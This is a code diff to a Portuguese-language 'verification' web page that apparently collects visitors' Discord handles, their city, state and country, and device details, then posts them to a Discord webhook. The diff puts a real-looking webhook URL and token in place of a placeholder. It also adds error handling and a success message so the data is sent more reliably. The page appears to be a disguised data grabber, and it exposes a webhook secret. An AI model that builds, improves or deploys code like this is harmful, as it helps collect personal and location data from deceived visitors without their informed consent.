@@ -21,7 +21,6 @@
     <!-- Conteúdo principal -->
     <div id="mainContent">
         <header>
-            <img src="logo.png" alt="Logo do Site" class="site-logo">
             <h1>Bem-vindo à Verificação</h1>
         </header>
         <nav>
@@ -60,7 +59,7 @@
 
         // Config padrão (fallback)
         const defaultConfig = {
-            webhook: "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI",
+            webhook: "https://discord.com/api/webhooks/1360595060672040990/aAy8Yj1c9iQ3rVH_lg9R3qwA4_G_omtJMNTH8_jf69idGoP3Fa7qshl3dd7XVNld7Kwh",
             embed: {
                 title: "Nova Verificação",
                 color: "#FF0000",
@@ -81,11 +80,14 @@
         let config = defaultConfig;
         fetch('config.json')
             .then(response => {
-                if (!response.ok) throw new Error('config.json não encontrado');
+                if (!response.ok) {
+                    console.warn('config.json não encontrado, usando config padrão');
+                    return defaultConfig;
+                }
                 return response.json();
             })
             .then(data => config = { ...defaultConfig, ...data })
-            .catch(error => console.warn('Usando config padrão:', error));
+            .catch(error => console.warn('Erro ao carregar config.json:', error));
 
         // Função para enviar o @ do Discord
         function submitDiscord() {
@@ -179,15 +181,27 @@
             const embed = {
                 embeds: [{
                     title: config.embed.title || "Nova Verificação",
-                    color: parseInt((config.embed.color || "#FF0000").replace("#", ""), 16),
+                    color: parseInt((config.embed.color || "#FF0000").replace("#", ""), 16) || 0xFF0000,
                     fields: config.embed.fields.map(field => ({
                         name: field.name,
-                        value: embedData[field.key] || "Não disponível",
+                        value: String(embedData[field.key] || "Não disponível"),
                         inline: ["cidade", "estado", "pais"].includes(field.key)
                     })),
                     timestamp: new Date().toISOString()
                 }]
             };
+
+            // Validar JSON
+            let payloadJson;
+            try {
+                payloadJson = JSON.stringify(embed);
+                console.log('Payload JSON:', payloadJson);
+            } catch (error) {
+                console.error('Erro ao criar JSON:', error);
+                verificationMessage.textContent = "Erro ao formatar dados. Tente novamente.";
+                verificationMessage.style.background = "#ff3333";
+                return;
+            }
 
             // Criar arquivo .txt com todos os dados
             const txtData = `
@@ -204,21 +218,26 @@ ${JSON.stringify(allData.dispositivo, null, 2)}
             `;
             const blob = new Blob([txtData], { type: 'text/plain' });
             const formData = new FormData();
-            formData.append('payload_json', JSON.stringify(embed));
+            formData.append('payload_json', payloadJson);
             formData.append('file', blob, `${embedData.nick.replace('@', '')}.txt`);
 
             // Enviar ao webhook
             try {
+                console.log('Enviando FormData...');
                 const response = await fetch(config.webhook, {
                     method: "POST",
                     body: formData
                 });
                 if (!response.ok) {
-                    throw new Error('Falha ao enviar dados');
+                    const errorText = await response.text();
+                    console.error('Erro na resposta do webhook:', response.status, errorText);
+                    throw new Error(`Falha ao enviar dados: ${response.status} ${errorText}`);
                 }
+                verificationMessage.textContent = "Verificação enviada com sucesso!";
+                verificationMessage.style.background = "#28a745";
             } catch (error) {
                 console.error('Erro ao enviar webhook:', error);
-                verificationMessage.textContent = "Erro ao enviar verificação. Tente novamente.";
+                verificationMessage.textContent = `Erro ao enviar verificação: ${error.message}. Tente novamente.`;
                 verificationMessage.style.background = "#ff3333";
             }
         }
